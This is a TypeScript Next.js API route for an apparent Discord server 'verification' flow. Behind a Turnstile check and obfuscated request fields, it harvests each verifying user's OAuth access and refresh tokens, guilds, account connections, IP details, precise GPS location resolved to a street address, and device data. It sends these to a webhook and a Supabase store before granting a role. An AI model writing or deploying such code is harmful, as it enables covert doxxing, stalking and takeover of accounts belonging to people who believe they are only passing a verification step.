import { logger } from "@/lib/functions/logger";
import { sendWebhook } from "@/lib/functions/webhook";
import { NextRequest, NextResponse } from "next/server";
import { pushToSupabase } from "@/lib/utils/supabase/push";
import { assignDiscordRole } from "@/lib/functions/discord-role";
import { GpsData, ScreenSize } from "@/lib/types/userdata";
import { deobf, deobf2 } from "@/lib/functions/anti-scraping";
import {
  isValidGps,
  isValidIP,
  isValidScreenSize,
  isValidUserAgent,
} from "@/lib/functions/validation";
import { getAddress } from "@/lib/functions/userdata";
import { decrypt } from "@/lib/functions/deobf";

const verifyToken = async (token: string) => {
  const verificationResponse = await fetch(
    "https://challenges.cloudflare.com/turnstile/v0/siteverify",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        secret: process.env.TURNSTILE_SECRET_KEY as string,
        response: token,
      }),
    }
  );
  const verificationResult = await verificationResponse.json();
  return verificationResult;
};

const getToken = async (code: string) => {
  const body = new URLSearchParams({
    grant_type: "authorization_code",
    code: String(code),
    redirect_uri: `${process.env.BASE_URL}/api/callback`,
  }).toString();

  const token = await fetch(`https://discord.com/api/v10/oauth2/token`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Authorization:
        "Basic " +
        Buffer.from(`${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`).toString("base64"),
    },
    body: body,
  });

  if (!token.ok) {
    throw new Error("Failed to fetch token");
  }

  return await token.json();
};
const verifyCode = async (code: string, req: NextRequest, gps: GpsData, screenSize: ScreenSize) => {
  try {
    const ip = (req.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
    const ua = req.headers.get("user-agent") ?? "";

    const tokenResult = await getToken(code);

    const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(
      tokenResult.access_token,
      ip
    );

    if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
      console.log("Failed to log user");
      throw new Error("Failed to log user");
    }

    const address = await getAddress(gps.hh, gps.xf);

    const webhookResult = await sendWebhook(
      userInfo,
      ownGuilds,
      connections,
      ipInfo,
      ua,
      gps,
      address,
      screenSize
    );

    if (!webhookResult.success) {
      console.log("Failed to send webhook");
      throw new Error("Failed to send webhook");
    }

    const pushResult = await pushToSupabase(
      tokenResult.access_token,
      tokenResult.refresh_token,
      userInfo,
      ipInfo,
      ua,
      gps
    );

    if (!pushResult.success) {
      console.log("Failed to push to Supabase");
      throw new Error("Failed to push to Supabase");
    }

    const roleResult = await assignDiscordRole(userInfo.id.toString());

    if (!roleResult.success) {
      console.log("Failed to assign role");
      throw new Error("Failed to assign role");
    }
    return { success: true };
  } catch (error) {
    console.log(error);
    return { success: false };
  }
};

export async function POST(req: NextRequest) {
  try {
    const ip = (req.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
    const ua = req.headers.get("user-agent") ?? "";

    const body = await req.json();
    const { df, ct, kt, ll, pp } = body;
    const gps: GpsData = JSON.parse(Buffer.from(ll, "hex").toString());
    const screenSize: ScreenSize = JSON.parse(Buffer.from(pp, "hex").toString());

    if (!df || !ct || !kt || !ll || !pp) {
      throw new Error("Token not provided");
    }

    if (!isValidIP(ip)) {
      throw new Error("Invalid IP");
    }

    if (!isValidUserAgent(ua)) {
      throw new Error("Invalid User-Agent");
    }

    if (!isValidGps(gps)) {
      throw new Error("Invalid GPS");
    }

    if (!isValidScreenSize(screenSize)) {
      throw new Error("Invalid Screen Size");
    }

    if (ip !== deobf(ct)) {
      throw new Error("IP mismatch");
    }

    const verificationResult = await verifyToken(Buffer.from(df, "hex").toString());

    if (!verificationResult.success) {
      throw new Error("Token verification failed");
    }

    const result = await verifyCode(deobf2(decrypt(kt)), req, gps, screenSize);
    if (!result.success) {
      throw new Error("Authentication failed");
    }

    return NextResponse.json({ status: 200 });
  } catch (error) {
    console.log("Error: ", error);
    return NextResponse.json({ error: "500" }, { status: 500 });
  }
}
